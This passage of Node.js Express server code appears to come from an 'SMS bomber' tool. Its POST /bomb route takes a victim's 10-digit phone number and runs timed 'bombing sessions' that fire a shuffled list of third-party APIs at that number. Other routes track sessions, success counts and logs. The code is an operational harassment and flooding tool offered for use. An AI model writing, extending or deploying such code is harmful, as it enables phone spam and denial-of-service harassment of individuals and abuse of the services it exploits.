    activeSessions.delete(sessionId);
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    logSuccess(`✅ SESSION ${sessionId} END | Phone: ${phone} | Cycles: ${session.cycleCount} | Success: ${session.successCount} | Fail: ${session.failCount} | Time: ${elapsed}s`);
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: APIS.length,
        active_sessions: activeSessions.size,
        mode: 'random-shuffle',
        cycle_duration_sec: CYCLE_DURATION_MS / 1000,
        uptime: process.uptime()
    });
});

app.get('/health', (req, res) => {
    res.json({
        ready: true,
        total_apis: APIS.length,
        active_sessions: activeSessions.size,
        mode: 'random-shuffle',
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);

    sessionCounter++;
    const sessionId = `S${sessionCounter}_${phone}`;

    activeSessions.set(sessionId, {
        sessionId,
        phone,
        duration: effectiveDuration,
        startTime: Date.now(),
        cycleCount: 0,
        successCount: 0,
        failCount: 0,
        instance: instance || 'default'
    });

    logInfo(`📱 NEW SESSION ${sessionId} | Phone: ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Active: ${activeSessions.size}`);

    runBombingSession(sessionId, phone, effectiveDuration).catch(err => {
        logError(`SESSION ${sessionId} ERROR: ${err.message}`);
        activeSessions.delete(sessionId);
    });

    res.json({
        success: true,
        session_id: sessionId,
        phone,
        duration: effectiveDuration,
        total_apis: APIS.length,
        mode: 'random-shuffle',
        cycle_duration: '60s',
        message: 'Bombing started. Random shuffle — each user gets different API order.'
    });
});

app.get('/logs', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    const logs = logStore.getAll();
    res.json({
        total_logs: logs.length,
        retention: '2 minutes',
        active_sessions: activeSessions.size,
        sessions: Array.from(activeSessions.values()).map(s => ({
            sessionId: s.sessionId,
            phone: s.phone,
            duration: s.duration,
            cycleCount: s.cycleCount,
            successCount: s.successCount,
            failCount: s.failCount,
            elapsed: ((Date.now() - s.startTime) / 1000).toFixed(1) + 's'
        })),
        logs: logs.slice(-limit)
    });
});

app.get('/sessions', (req, res) => {
    res.json({
        active_sessions: activeSessions.size,
        sessions: Array.from(activeSessions.values()).map(s => ({
            sessionId: s.sessionId,
            phone: s.phone,
            duration: s.duration,
            cycleCount: s.cycleCount,
            successCount: s.successCount,
            failCount: s.failCount,
            elapsed: ((Date.now() - s.startTime) / 1000).toFixed(1) + 's'
        }))
    });
});

app.post('/stop/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    if (activeSessions.has(sessionId)) {
        activeSessions.delete(sessionId);
        logWarn(`🛑 SESSION ${sessionId} STOPPED`);
        res.json({ success: true, message: 'Session stopped' });
    } else {
        res.json({ success: false, message: 'Session not found' });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        mode: 'random-shuffle',
        cycle_duration_sec: CYCLE_DURATION_MS / 1000,
        apis: APIS.map(a => a.name)
    });
});

// ============================================================
// ===== START SERVER =====
// ============================================================

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    logSuccess(`API Server running on port ${PORT}`);
    logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    logInfo(`APIs loaded: ${APIS.length}`);
    logInfo(`Mode: RANDOM SHUFFLE (har cycle me naya order)`);
    logInfo(`Cycle duration: ${CYCLE_DURATION_MS / 1000}s per cycle`);
    logInfo(`Per-API timeout: ${PER_API_TIMEOUT}ms`);
    logInfo(`Max duration: ${MAX_EFFECTIVE_DURATION} min`);
    logInfo(`Parallel sessions: ENABLED`);
    logInfo(`Different users → Different API order`);

    logStore.startCleanup();
});
